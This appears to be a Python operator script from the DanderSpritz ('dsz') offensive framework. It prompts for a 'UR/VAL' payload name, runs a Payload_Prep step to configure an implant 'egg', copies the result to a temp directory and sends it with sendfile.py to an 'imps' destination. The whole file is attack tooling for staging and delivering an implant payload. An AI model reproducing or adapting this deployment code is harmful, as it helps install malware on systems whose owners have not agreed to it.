
import dsz, dsz.ui, dsz.cmd
import ops
import traceback
import globalconfig, sendfile
import os, distutils.file_util, os.path, sys
if (len(sys.argv) <= 1):
    eggname = dsz.ui.GetString('What is your UR/VAL name?')
else:
    eggname = sys.argv[1]
if (not dsz.cmd.Run('python Payload\\_Prep.py -args "-action configure" -project pc', dsz.RUN_FLAG_RECORD)):
    ops.error('Payload was not properly configured, bailing...')
    sys.exit((-1))
payloadfile = dsz.cmd.data.Get('Payload::File', dsz.TYPE_STRING)[0]
uploadfilename = os.path.join(globalconfig.config['paths']['tmp'], ('%s_configured_egg' % eggname))
distutils.file_util.copy_file(payloadfile, uploadfilename)
try:
    dsz.cmd.Run(('python lib\\sendfile.py -args " --destdir imps  -i %s -o %s " -project Ops' % (uploadfilename, eggname)))
except:
    ops.warn('Failed to send your payload to imps, error below')
    traceback.print_exc(sys.exc_info())